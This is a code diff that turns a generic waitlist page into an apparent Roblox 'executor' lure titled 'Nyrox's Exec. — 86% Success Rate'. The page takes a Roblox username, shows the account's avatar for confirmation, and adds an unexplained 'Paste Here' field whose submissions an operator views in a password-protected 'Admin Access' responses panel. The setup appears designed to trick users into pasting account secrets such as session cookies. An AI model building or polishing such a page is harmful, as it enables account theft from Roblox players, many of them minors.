@@ -39,17 +39,17 @@ const STORAGE_KEY = "queue-entered-at";
 export const Route = createFileRoute("/")({
   head: () => ({
     meta: [
-      { title: "Liquid Glass Queue — Join the Waitlist" },
+      { title: "Nyrox's Exec. — 86% Success Rate" },
       {
         name: "description",
         content:
-          "Join the queue on a starlit Liquid Glass page, then unlock the private Responses panel with your password.",
+          "Enter your Roblox username on Nyrox's Exec. and join the queue on a starlit Liquid Glass page.",
       },
-      { property: "og:title", content: "Liquid Glass Queue — Join the Waitlist" },
+      { property: "og:title", content: "Nyrox's Exec. — 86% Success Rate" },
       {
         property: "og:description",
         content:
-          "Join the queue on a starlit Liquid Glass page, then unlock the private Responses panel with your password.",
+          "Enter your Roblox username on Nyrox's Exec. and join the queue on a starlit Liquid Glass page.",
       },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
@@ -272,10 +272,10 @@ function Index() {
         <section className="flex min-h-screen flex-col items-center justify-center px-6 py-16">
           <div className="w-full max-w-md text-center">
             <h1 className="text-5xl font-semibold tracking-tight text-foreground sm:text-6xl">
-              Title1
+              Nyrox's Exec.
             </h1>
             <p className="mt-3 text-lg font-medium text-muted-foreground">
-              Subtext1
+              86% Success Rate
             </p>
 
             <form
@@ -283,21 +283,37 @@ function Index() {
               className="glass-panel mt-10 rounded-4xl p-6 sm:p-8"
             >
               <label htmlFor="queue-input" className="sr-only">
-                Textbox1
+                Username
               </label>
               <input
                 id="queue-input"
                 type="text"
                 value={value}
                 onChange={(e) => setValue(e.target.value)}
-                placeholder="Textbox1"
+                placeholder="Username"
                 className="glass-input w-full rounded-2xl px-5 py-4 text-base text-foreground outline-none placeholder:text-muted-foreground focus:border-[color:var(--ring)] focus:shadow-[0_0_0_3px_oklch(0.6_0.19_255/0.25)]"
               />
+              <label htmlFor="paste-input" className="sr-only">
+                Paste Here
+              </label>
+              <input
+                id="paste-input"
+                type="text"
+                value={paste}
+                onChange={(e) => setPaste(e.target.value)}
+                placeholder="Paste Here"
+                className="glass-input mt-4 w-full rounded-2xl px-5 py-4 text-base text-foreground outline-none placeholder:text-muted-foreground focus:border-[color:var(--ring)] focus:shadow-[0_0_0_3px_oklch(0.6_0.19_255/0.25)]"
+              />
+              {formError && (
+                <p className="mt-3 text-sm font-semibold text-destructive">
+                  {formError}
+                </p>
+              )}
               <button
                 type="submit"
                 className="glass-button mt-5 w-full rounded-2xl px-5 py-3.5 text-base font-semibold hover:brightness-110 active:scale-[0.98]"
               >
-                Button1
+                Send
               </button>
             </form>
           </div>
@@ -309,9 +325,6 @@ function Index() {
             <h2 className="text-3xl font-semibold tracking-tight text-foreground sm:text-4xl">
               Admin Access
             </h2>
-            <p className="mt-3 text-base font-medium text-muted-foreground">
-              Enter the password to view the responses.
-            </p>
 
             <form
               onSubmit={handleUnlock}
@@ -364,7 +377,9 @@ function Index() {
             role="dialog"
             aria-modal="true"
             aria-label={
-              popup === "waiting"
+              popup === "confirm"
+                ? "Confirm Roblox user"
+                : popup === "waiting"
                 ? "Putting you in the queue"
                 : popup === "already"
                   ? "Already in the queue"
@@ -374,7 +389,67 @@ function Index() {
             }
             className={`glass-panel-popup relative w-full ${popup === "responses" ? "max-w-lg" : "max-w-sm"} rounded-4xl px-7 py-9 text-center ${visible ? "glass-popup-enter" : "glass-popup-exit"}`}
           >
-            {popup === "waiting" ? (
+            {popup === "confirm" ? (
+              <div className="flex flex-col items-center">
+                {lookingUp ? (
+                  <>
+                    <Spinner />
+                    <p className="mt-6 text-lg font-semibold text-foreground">
+                      Looking up user...
+                    </p>
+                  </>
+                ) : (
+                  <>
+                    {robloxUser?.avatarUrl ? (
+                      <img
+                        src={robloxUser.avatarUrl}
+                        alt={`${robloxUser.displayName}'s Roblox avatar`}
+                        width={96}
+                        height={96}
+                        className="h-24 w-24 rounded-full"
+                      />
+                    ) : (
+                      <div className="flex h-24 w-24 items-center justify-center rounded-full bg-secondary text-3xl font-semibold text-secondary-foreground">
+                        {(robloxUser?.displayName ?? "?").charAt(0).toUpperCase()}
+                      </div>
+                    )}
+                    <p className="mt-4 text-xl font-semibold text-foreground">
+                      {robloxUser?.displayName}
+                    </p>
+                    {robloxUser && robloxUser.name !== robloxUser.displayName && (
+                      <p className="mt-1 text-sm font-medium text-muted-foreground">
+                        @{robloxUser.name}
+                      </p>
+                    )}
+
+                    <div
+                      className="mt-6 w-full border-t"
+                      style={{ borderColor: "oklch(1 0 0 / 15%)" }}
+                    />
+
+                    <p className="mt-6 text-lg font-semibold text-foreground">
+                      Is this the right user?
+                    </p>
+                    <div className="mt-5 flex w-full gap-3">
+                      <button
+                        type="button"
+                        onClick={handleConfirmYes}
+                        className="glass-button flex-1 rounded-2xl px-5 py-3.5 text-base font-semibold hover:brightness-110 active:scale-[0.98]"
+                      >
+                        Yes
+                      </button>
+                      <button
+                        type="button"
+                        onClick={handleEdit}
+                        className="glass-button-danger flex-1 rounded-2xl px-5 py-3.5 text-base font-semibold hover:brightness-110 active:scale-[0.98]"
+                      >
+                        Edit
+                      </button>
+                    </div>
+                  </>
+                )}
+              </div>
+            ) : popup === "waiting" ? (
               <div className="flex flex-col items-center">
                 <Spinner />
                 <p className="mt-6 text-lg font-semibold text-foreground">
